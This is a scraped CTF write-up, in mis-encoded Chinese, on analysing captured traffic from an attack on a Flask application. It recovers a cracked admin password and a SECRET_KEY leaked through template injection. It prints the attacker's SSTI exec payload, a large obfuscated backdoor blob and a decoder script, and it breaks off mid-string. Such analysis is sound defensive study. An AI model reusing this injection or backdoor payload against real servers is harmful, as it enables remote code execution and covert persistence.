#cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">0.å‰è¨€</h2>
<p>ä¸€ç›´ä»¥æ¥éƒ½æƒ³å†™ä¸ªæµé‡åˆ†æçš„åšé¢˜æ€»ç»“ï¼Œæ€»ç»“ä¸€äº›æ€è·¯å’Œæ–¹æ³•ï¼Œä½†æ‰¾ä¸åˆ°å¥½çš„ä¾‹é¢˜ï¼Œåˆšå¥½å›½èµ›è¿™é“æµé‡åˆ†æå°±æŒºé€‚åˆçš„</p>
<p>é¢˜ç›®å†…å®¹</p>
<pre><code class="hljs language-c" lang="c">è¿‘æœŸå‘ç°å…¬å¸ç½‘ç»œå‡ºå£å‡ºç°äº†å¼‚å¸¸çš„é€šä¿¡ï¼Œç°éœ€è¦é€šè¿‡åˆ†æå‡ºå£æµé‡åŒ…ï¼Œå¯¹å¤±é™·æœåŠ¡å™¨è¿›è¡Œå®šä½ã€‚ç°åœ¨éœ€è¦ä½ ä»ç½‘ç»œæ”»å‡»æ•°æ®åŒ…ä¸­æ‰¾å‡ºæ¼æ´æ”»å‡»çš„ä¼šè¯ï¼Œåˆ†æä¼šè¯ç¼–å†™<span class="hljs-built_in">exp</span>æˆ–æ•°æ®åŒ…é‡æ”¾ï¼ŒæŸ¥æ‰¾æœåŠ¡å™¨ä¸Šå®‰è£…çš„åé—¨æœ¨é©¬ï¼Œç„¶ååˆ†ææœ¨é©¬å¤–è”åœ°å€å’Œé€šä¿¡å¯†é’¥ä»¥åŠæœ¨é©¬å¯åŠ¨é¡¹ä½ç½®ã€‚
</code></pre>
<h2 data-id="heading-1">1.SnakeBackdoor-1</h2>
<pre><code class="hljs">æ”»å‡»è€…çˆ†ç ´æˆåŠŸçš„åå°å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿï¼Œç»“æœæäº¤å½¢å¼ï¼šflag{xxxxxxxxx}
</code></pre>
<p>ç›´æ¥ç­›é€‰å‡ºhttpæµé‡</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff9046eff77045bea58a6e3cabf8e0df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=sVLBbrXsR%2F8cZlG2mZjJ5eGHcNY%3D" alt="" loading="lazy"/></p>
<p>å¹¶æ‰¾åˆ°æœ€åä¸€ä¸ªloginï¼Œå³é”®è¿½è¸ªä¸€ä¸‹ï¼Œå°±çœ‹åˆ°åå°å¯†ç äº†</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9621c4ec2e9141799e8609037b90d298~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=7cUJxklZvXHr3gtD%2BeL2%2BOkqsMw%3D" alt="" loading="lazy"/></p>
<p>flag{zxcvbnm123}</p>
<h2 data-id="heading-2">2.SnakeBackdoor-2</h2>
<pre><code class="hljs language-go" lang="go">æ”»å‡»è€…é€šè¿‡æ¼æ´åˆ©ç”¨è·å–Flaskåº”ç”¨çš„ <span class="hljs-string">`SECRET_KEY`</span> æ˜¯ä»€ä¹ˆï¼Œç»“æœæäº¤å½¢å¼ï¼šflag{xxxxxxxxxx}
</code></pre>
<p>æ¨¡ç³ŠæŸ¥è¯¢ï¼Œç›´æ¥æ‰¾åˆ°è¿™ä¸ªå…³é”®å­—â€œSECRET_KEY"</p>
<pre><code class="hljs language-sql" lang="sql">http <span class="hljs-keyword">contains</span> "SECRET_KEY"
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3748fd028f6f4f45995a0b8efafe41b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=OqS1DisrI6KAg015F04dqYbtLUk%3D" alt="" loading="lazy"/></p>
<p>å³é”®è¿›è¡Œä¸€ä¸ªè¿½è¸ªï¼Œå¹¶æŸ¥è¯¢å…³é”®å­—SECRET_KEY</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e59327389edb496285688da43e748712~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=gPLBPozf3UgueXoSjZZkzeUh5CM%3D" alt="" loading="lazy"/></p>
<p>è¿™æ®µæµé‡æ˜¯ <strong>Flask æ¡†æ¶åº”ç”¨é…ç½®å¯¹è±¡</strong> çš„å®Œæ•´åºåˆ—åŒ–è¾“å‡ºï¼Œæ”»å‡»è€…é€šè¿‡ <strong>SSTIï¼ˆæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼‰</strong> æ¼æ´æˆåŠŸè¯»å–äº†å†…å­˜ä¸­çš„æ•æ„Ÿå˜é‡</p>
<ul>
<li>
<p><strong>å†…å®¹</strong>ï¼š'SECRET_KEY': 'c6242af0-6891-4510-8432-e1cdf051f160'</p>
</li>
<li>
<p><strong>å®‰å…¨æ„ä¹‰</strong>ï¼šè¿™æ˜¯ Flask åº”ç”¨æœ€æ ¸å¿ƒçš„å®‰å…¨å‡­è¯</p>
</li>
<li>
<p><strong>ä¸€èˆ¬ç”¨æ¥</strong>ï¼šSession ç­¾åï¼Œä¹Ÿå°±æ˜¯Flask é»˜è®¤å°† Session å­˜å‚¨åœ¨å®¢æˆ·ç«¯ Cookie ä¸­ï¼Œå¹¶ä½¿ç”¨æ­¤ Key è¿›è¡Œ HMAC ç­¾åï¼Œä¸€æ—¦æ³„éœ²ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å·¥å…·ï¼Œæ¯”å¦‚è¯´ flask-unsignä¼ªé€ ä»»æ„ç”¨æˆ·çš„ Sessionï¼Œä¾‹å¦‚å°† user_id æ”¹ä¸º 1 æˆ– adminï¼Œä»è€Œå®ç°<strong>è¶Šæƒç™»å½•</strong>ï¼Œç”šè‡³åœ¨æŸäº›é…ç½®ä¸‹å¯¼è‡´ <strong>RCE</strong></p>
</li>
</ul>
<p>æ‰€ä»¥å¯¹åº”çš„flag{c6242af0-6891-4510-8432-e1cdf051f160}</p>
<h2 data-id="heading-3">3.SnakeBackdoor-3</h2>
<pre><code class="hljs language-scss" lang="scss">æ”»å‡»è€…æ¤å…¥çš„æœ¨é©¬ä½¿ç”¨äº†åŠ å¯†ç®—æ³•æ¥éšè—é€šè®¯å†…å®¹ã€‚è¯·åˆ†ææ³¨å…¥Payloadï¼Œç»™å‡ºè¯¥åŠ å¯†ç®—æ³•ä½¿ç”¨çš„å¯†é’¥å­—ç¬¦ä¸²(Key) ï¼Œç»“æœæäº¤å½¢å¼ï¼šflag{xxxxxxxx}
</code></pre>
<p>ç»§ç»­å¾€åç¿»ï¼Œä¼šå‘ç°1789æµæœ‰å¼‚å¸¸</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6aa70c6c70b7409abeb4127905f71c9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=DzWcQ6EfySjRi2iEolYloGKhVj0%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>ä¸ºä»€ä¹ˆè¯´è¿™æ®µæµé‡æ˜¯å¯ç–‘çš„ï¼Ÿ</p>
</blockquote>
<ul>
<li>
<p>é¦–å…ˆï¼Œå†…å®¹ä»¥ {{ ... }} åŒ…è£¹ï¼Œæ­£å¸¸çš„â€œé¢„è§ˆé¢„è§ˆâ€åŠŸèƒ½åº”è¯¥åªå¤„ç†çº¯æ–‡æœ¬æˆ–ç®€å•çš„ HTMLï¼Œè€Œè¿™é‡Œæäº¤çš„æ˜¯ Jinja2 æ¨¡æ¿æ‰§è¡Œä»£ç </p>
</li>
<li>
<p>å…¶æ¬¡ï¼Œå®ƒæœ‰å±é™©å‡½æ•°çš„è°ƒç”¨ï¼Œè½½è·ä¸­å‡ºç°äº† <code>url_for.__globals__['__builtins__']['exec']</code></p>
<ul>
<li>
<p><strong>globals</strong>ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“å®ƒæ˜¯è¯•å›¾è®¿é—® Python çš„å…¨å±€å‘½åç©ºé—´</p>
</li>
<li>
<p>execï¼Œè¿™åˆæ˜¯ Python æœ€å±é™©çš„å‡½æ•°ï¼Œèƒ½å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ‰§è¡Œï¼ŒåŸºæœ¬ä¸Š<strong>ä»»ä½•åœ¨æµé‡ä¸­çœ‹åˆ°çš„ exec åŸºæœ¬ä¸Šéƒ½æ˜¯ RCE çš„æ ‡å¿—</strong></p>
</li>
</ul>
</li>
<li>
<p>æ¥ç€ï¼Œå®ƒé‡Œé¢è¿˜åµŒå¥—äº† base64.b64decodeã€zlib.decompress ä»¥åŠ [::-1]ç­‰ä¸€å¤§å †ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ï¼Œæ­£å¸¸çš„ä¸šåŠ¡è¯·æ±‚ç»ä¸ä¼šå°†ä»£ç è¿›è¡Œå‹ç¼©ã€åè½¬å†å‘é€</p>
</li>
<li>
<p>æœ€åï¼Œä¸€ä¸ªç®€å•çš„â€œHello Worldâ€é¢„è§ˆè¯·æ±‚é€šå¸¸åªæœ‰å‡ åä¸ªå­—èŠ‚ï¼Œä½†è¿™ä¸ªè¯·æ±‚çš„ Content-Length è¾¾åˆ°äº† <strong>4602</strong> å­—èŠ‚ï¼Œè¯´æ˜å…¶ä¸­éšè—äº†å¤æ‚çš„é€»è¾‘è„šæœ¬</p>
</li>
</ul>
<p>åˆ¤æ–­å¥½ä¹‹åï¼Œæˆ‘ä»¬å°±è¦åˆ†æè¿™æ®µå†…å®¹æ˜¯ä»€ä¹ˆäº†</p>
<p>é¦–å…ˆæ˜¯SSTI æ³¨å…¥å±‚ï¼Œä½¿ç”¨ {{<code>url_for.__globals__['__builtins__']['exec']</code>(ä»£ç , ä¸Šä¸‹æ–‡)}}ï¼Œè¿™æ˜¯åˆ©ç”¨äº† Flask çš„æ¨¡æ¿æ³¨å…¥æ¼æ´æ¥è°ƒç”¨ Python çš„å†…ç½® exec å‡½æ•°</p>
<p>å…¶æ¬¡ï¼ŒBase64 ç¼–ç å±‚ï¼ˆå¤–å£³ï¼‰exec(base64.b64decode('XyA9IGxh...'))è¿™æ®µ <strong>Base64 è§£ç </strong>åæ˜¯<code>_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1])); exec((_)(b'=c4CU3xP...'))</code>è¿™å®šä¹‰äº†ä¸€ä¸ªè§£å¯†å‡½æ•° _ï¼š<strong>åè½¬å­—ç¬¦ä¸² -&gt; Base64 è§£ç  -&gt; Zlib è§£å‹</strong></p>
<pre><code class="hljs language-css" lang="css">_ = lambda __ : <span class="hljs-built_in">__import__</span>(<span class="hljs-string">'zlib'</span>).<span class="hljs-built_in">decompress</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">'base64'</span>).<span class="hljs-built_in">b64decode</span>(__[::-<span class="hljs-number">1</span>]));exec((_)(<span class="hljs-selector-tag">b</span>'=c4CU3xP+//vPzftv8gri635a0T1rQvMlKGi3iiBwvm6TFEvahfQE2PEj7FOccTIPI8TGqZMC+l9AoYYGeGUAMcarwSiTvBCv37ys+N185NocfmjE/fOHei4One0CL5TZwJopElJxLr9VFXvRloa5QvrjiTQKeG+SGbyZm+<span class="hljs-number">5</span>zTk/V3nZ0G6Neap7Ht6nu+acxqsr/sgc6ReEFxfEe2p30Ybmyyis3uaV1p+Aj0iFvrtSsMUkhJW9V9S/<span class="hljs-selector-tag">tO</span>+<span class="hljs-number">0</span>/<span class="hljs-number">68</span>gfyKM/yE9hf6S9eCDdQpSyLnKkDiQk97TUuKDPsOR3pQldB/Urvbtc4WA1D/<span class="hljs-number">9</span>ctZAWcJ+jHJL1k+NpCyvKGVhxH8DLL7lvu+w9InU/<span class="hljs-number">9</span>zt1sX/TsURV7V0xEXZNSllZMZr1kcLJhZeB8W59ymxqgqXJJYWJi2n96hKtSa2dab/F0xBuRiZbTXFIFmD6knGz/oPxePTzujPq5IWt8NZmvyM5XDg/L8JU/mC4PSvXA+gqeuDxLClzRNDHJUmvtkaLbJvbZcSg7Tgm7USeJWkCQojSi+INIEj5cN1+FFgpKRXn4gR9yp3/V79WnSeEFIO6C4hcJc4mwpk+<span class="hljs-number">09</span>t1yue4+mAlbhlxnXM1Pfk+sGBmaUFE1kEjOpnfGnqsV+auOqjJgcDsivId+wHPHazt5MVs4rHRhYBOB6yXjuGYbFHi3XKWhb7AfMVvhx7F9aPjNmIiGqBU/hRFUuMqBCG+VVUVAbd5pFDTZJ3P8wUym6QAAYQvxG+ZJDRSQypOhXK/L4eFFtEziufZPSyrYPJWJlAQsDO+dli46cn1u5A5Hyqfn4vw7zSqe+VUQ/Ri/Knv0pQoWH1d9dGJwDfqmgvnKi+gNRugcfUjG73V6s/tihlt8B23KvmJzqiLPzmuhr0RFUJKZjGa73iLXT4OvlhLRaSbTT4tq/SCktGRyjLVmSj2kr0GSsqTjlL2l6c/cXKWjRMt1kMCmCCTV+aJe4npvoB99OMnKnZR4Ys526mTFToSwa5jmxBmkRYCmA82GFK7ak6bIRTfDMsWGsZvAEXv3Pfv5NRzcIFNO3tbQkeB/LIVOW5LfAkmR68/<span class="hljs-number">6</span>zrL0DZoPjzFZI5VLfq0rv9CwUeJkR3PHcuj++d/lOvk8/h3HzSgYTGCwl1ujz8h4oUiPyGT74NjbY7fJ8vUHqNz+ZVfOtVw/z3RMuqSUzEAKrjcU2DNQehB0oY7xIlOT9u9BT4ROoDFo+<span class="hljs-number">5</span>ZF6zVoHA4eIckXUOP3ypQv5pEYG+<span class="hljs-number">0</span>pW4MyHmAQfsOaWyMdfMoqbw/M9oImdGKdKy1Wq3aq+t+xuyVdNAQMhoW2A7zQzob8XGA3G8VuoKHGOcc25HCb/FYeSxdwyIedAxklLLYMBHojTSpD1dExozdi89Gikhz3305ndTmECv0ZoUOHacnqtUUhJly7VgvX+JlawAY9orNPUmZM7QKbdOkTf/o8aQlS5Fe/xQkOMJGm4NXqLehiRIb925sTfVxwoNfP5v1MGlarYMifHl2rEp5C71ipFjpAGaEp9nRj0JgEa4lSTuYeVXwqbZQT3OfQvgt/bHJlAguqSWysGhqhITJYM6T10m71JiwfQH5iLXH5XbFk53QGcG2cAnFrWy70xEvabmf0u0ikQwpU2scP8LoEa/ClJnPSuWwicMkVLrkZGqnBvbk6JTg7HnT0vGUcV6kffIL6CK3bE1Fy0R6sl+UPoYvjkgSI3UbfD67bRxIxegBpYTzyCDzPytSE+a77sdxsghLpUC5hxz4ZeXdyIrbmhAqQw5eEnBuASE5qTMJkTp//hky+dT2pciOBYn/ACSLxprLZ0Ay1+zhl+XyV9WFL4NgBoH34bvkxH36nctszopWGPyd14RiS4d0EqNocqvtWu3YxkNgP+<span class="hljs-number">8</span>fM/d/B0ikxKxh/GjkmQXaSX/<span class="hljs-selector-tag">B</span>+<span class="hljs-number">40</span>U4bfSbsEJpVOsTHTy6u0Nr67Sw7BvRwuVvfT0/<span class="hljs-number">8</span>j73gYHBO2fGSIJ47ArYVm2+LzRT0iH5j7yVRmptcnAn8KkxJ63WBGb7u3bd+D+<span class="hljs-number">3</span>ylnm1h4AR7MGN6r6LxpjNlAX11wa/XB1zN8cWUNnC3VczfwUEwPfi5dyo9nEC5WO9Um78WKRrm3c48IvTUhgdNeQEDosIfhMSmikEluQX8LcCRcK9eUT85bvr5J5rzEb+DuiGYyDFG7PZefvIb3w33u2q8zlxltWCStc5O4q8iWrVI7taZHxowTw5zJg9TdhBZ+fQrQtc0ydrBlvAlnY10vECnFUBA+y1lWsVn8cKxUjTdati4AF3iM/KuEtQ6Zn8bI4LYwMlGnCA1RG88J9l7G4dJzsWr9xOiD8iMI2N1eZd/QUy43YsILWx80yiCxz+G4bXf2qNRFvNOawPSnrpv6Q0oFEZojluPx7cOU27bAbgpwTKo0VUyH6G4+ysviQzU7SRd51LGG3U6cT0YDidQmz2ewtbkkKcGVcSyYOeClV6CRz6bdF/Gm3T2+Q914/lkZbKx19WnX78r+xw6bpjzWLr0E1gjnKCVxW0XSnwe+iG9dkG8nCFfjUlhdTaS1gJ7LFsmUjn8u/vRQbRLw/y66Irr/ynKOCzROcgrnDFxH3z3JTQQpTiDpeyzRsF4SnGBMv5Hbr+cK6YTa4MIbfzj5Ti3FMgJNqgK5Xk9hsilGsU6tUbnp6SKiJhUvJ8bqynUMEzndl+S+OVRCaH2iJl8U3WjyB68Rq4HATk/cK7LkJHHMjC3W7dTmOBpfoWMVELaL+RkqWYv0CpW5qENLlnOPBrGaGNeIZahzbnruEPIIXGkGz1fE5d42MaKZsCUYt1xXiai9+cbKGj/d0lICq7uc7bRhEBx46DyBXTz1gfJnT2ur6x4Avb5wY2pcYrcD2OR6AikMvm2c0bhabJB6o0DhONJ4lCxmKdGBzuwrts1u0D2yuo37yLLfsGDuyepNw8lyTNc2nyhCVBfW23DnBQmWc1QLCoRppVhjKXwOpODKO8R8YHnQM+rLk6EOabCdGK57iRzMcT3wc436kVmHXDcI0ZsYGY5aIC5DbdWjUt2ZuU0LmuLwzCTS99zhOoO8DKNqbK4bINLyAI2X928xib+hmIOqp3oSgC2PdFc8yqthN9S55omtex2xkEe8CY48C6z4JtqVtqhPQWQ8kte6xlepiVYCqIbE2Vg4fN//L/ff/u//<span class="hljs-number">9</span>p4Lz7uq46yWenkJ/x90j/<span class="hljs-number">5</span>mEIors5McSuFi9dygyyR5wJfuqGhOfsVVwJe'))
</code></pre>
<p>æ¥ç€ï¼Œåè½¬ + Zlib å‹ç¼©å±‚æ”»å‡»è€…å°†çœŸæ­£çš„æ¶æ„ä»£ç ï¼Œä¹Ÿå°±æ˜¯ä¸Šè¿°é‚£æ®µä»¥ =c4CU3xP å¼€å¤´çš„å·¨å¤§å­—ç¬¦ä¸²ï¼Œè¿›è¡Œäº† Zlib å‹ç¼©ï¼Œå¹¶åšäº†<strong>å­—ç¬¦åè½¬</strong>ï¼Œæœ€åå† Base64 ç¼–ç </p>
<p>æœ€åæ³¨æ„ Payload æœ«å°¾ï¼š{'request':..., 'app':get_flashed_messages.<strong>globals</strong>['current_app']}ï¼Œæ”»å‡»è€…å°† Flask çš„ app å¯¹è±¡ä¼ å…¥äº†æ‰§è¡Œç¯å¢ƒã€‚è¿™æ„å‘³ç€æ¶æ„ä»£ç å¯ä»¥ç›´æ¥è¯»å– app.config</p>
<p>æ‰€ä»¥exp.py</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> base64import zlibimport refrom typing <span class="hljs-keyword">import</span> <span class="hljs-type">Tuple</span>, <span class="hljs-type">Optional</span>â€‹<span class="hljs-keyword">class</span> <span class="hljs-title class_">PayloadDecoder</span>:    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_layers: <span class="hljs-built_in">int</span> = <span class="hljs-number">200</span></span>):        self.max_layers = max_layers        self.pattern = <span class="hljs-string">r"exec\(\(_\)\(b'([^']+)'\)\)"</span>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">_reverse_bytes</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:        <span class="hljs-keyword">return</span> data[::-<span class="hljs-number">1</span>]        <span class="hljs-keyword">def</span> <span class="hljs-title function_">_base64_decode</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:        <span class="hljs-keyword">return</span> base64.b64decode(data)        <span class="hljs-keyword">def</span> <span class="hljs-title function_">_zlib_decompress</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:        <span class="hljs-keyword">return</span> zlib.decompress(data)        <span class="hljs-keyword">def</span> <span class="hljs-title function_">_extract_nested_payload</span>(<span class="hljs-params">self, text: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>]:        <span class="hljs-keyword">match</span> = re.search(self.pattern, text)        <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_blob</span>(<span class="hljs-params">self, encoded: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:        reversed_data = self._reverse_bytes(encoded)        decoded = self._base64_decode(reversed_data)        decompressed = self._zlib_decompress(decoded)        <span class="hljs-keyword">return</span> decompressed        <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_payload</span>(<span class="hljs-params">self, payload: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">bytes</span>]:        current = self.decode_blob(payload)        layer_count = <span class="hljs-number">1</span>                <span class="hljs-keyword">while</span> layer_count &lt; self.max_layers:            <span class="hljs-keyword">try</span>:                text_content = current.decode(<span class="hljs-string">'utf-8'</span>)            <span class="hljs-keyword">except</span> UnicodeDecodeError:                text_content = current.decode(<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'replace'</span>)                        extracted = self._extract_nested_payload(text_content)                        <span class="hljs-keyword">if</span> extracted <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:                <span class="hljs-keyword">break</span>                            current = self.decode_blob(extracted.encode())            layer_count += <span class="hljs-number">1</span>                <span class="hljs-keyword">return</span> layer_count, currentâ€‹<span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>():    encoded_payload = <span class="hljs-string">b'=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